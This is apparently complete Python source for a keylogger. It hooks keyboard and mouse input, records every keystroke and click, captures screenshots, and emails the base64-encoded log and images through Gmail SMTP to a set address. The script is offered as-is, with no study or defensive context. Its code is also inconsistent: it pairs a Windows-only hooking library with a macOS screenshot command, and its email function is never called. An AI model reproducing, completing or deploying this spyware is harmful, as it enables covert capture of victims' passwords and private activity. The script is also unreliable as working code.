import pyHook, pythoncom, smtplib, base64, os, time, random, string

# Settings
yourgmail = "your_email@gmail.com"
yourgmailpass = "your_password"
sendto = "destination_email@example.com"
interval = 60

# Global variables
log_data = ""
pic_names = []

def on_event(event):
    global log_data, pic_names
    data = f"\n[{time.strftime('%H:%M:%S')}]\n"
    if event.MessageName == "mouse left down":
        data += f"Clicked in (Position): {event.Position}"
    elif event.MessageName == "key down":
        data += f"Keyboard key: {event.Key}"
    log_data += data
    if len(log_data) > 300:
        take_screenshot()

def take_screenshot():
    global pic_names
    name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    pic_names.append(name)
    os.system(f"screencapture {name}.png")

def send_email():
    global log_data, pic_names
    data = base64.b64encode(log_data.encode()).decode()
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, data)
    for pic in pic_names:
        with open(pic + '.png', 'rb') as file:
            data = base64.b64encode(file.read()).decode()
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(yourgmail, yourgmailpass)
                server.sendmail(yourgmail, sendto, data)

def start_keylogger():
    hook = pyHook.HookManager()
    hook.MouseAllButtonsDown = on_event
    hook.KeyDown = on_event
    hook.HookMouse()
    hook.HookKeyboard()
    pythoncom.PumpMessages()

start_keylogger()
